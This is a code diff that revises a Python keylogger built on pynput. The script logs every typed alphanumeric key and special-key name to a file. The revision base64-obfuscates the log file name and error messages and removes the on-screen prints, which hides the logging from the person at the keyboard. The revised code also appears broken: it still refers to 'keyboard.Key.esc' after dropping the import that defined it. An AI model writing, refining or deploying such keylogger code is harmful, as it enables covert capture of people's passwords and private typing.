@@ -1,22 +1,23 @@
-import sys
-sys.modules['p'] = __import__('pynput')
-from p import keyboard
+import os
+import base64
+from ctypes import windll
+def b64d(s): return base64.b64decode(s).decode()
+log_file = b64d('a2V5bG9ncy50eHQ=')
 def on_press(key):
     try:
-        with open('klg.tmp', 'a') as f:
-            if key.char in 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789':
+        if hasattr(key, 'char') and key.char.isalnum():
+            with open(log_file, 'a') as f:
                 f.write(key.char)
-                print(f'Key pressed: {key.char}')
-            else:
-                f.write(f'<{key}>')
-                print(f'Special key pressed: <{key}>')
+        else:
+            with open(log_file, 'a') as f:
+                f.write(f' <{key.name}> ')
     except AttributeError:
-        with open('klg.tmp', 'a') as f:
-            f.write(f'<{key}>')
-            print(f'Special key pressed: <{key}>')
+        pass
+    except IOError:
+        windll.user32.MessageBoxW(0, b64d('RXJyb3Igd3JpdGluZyB0byBmaWxl'), b64d('RXJyb3I='), 1)
 def on_release(key):
     if key == keyboard.Key.esc:
         return False
-listener = keyboard.Listener(on_press=on_press, on_release=on_release)
-listener.start()
-listener.join()
+from pynput.keyboard import Listener as L
+with L(on_press=on_press, on_release=on_release) as listener:
+    listener.join()
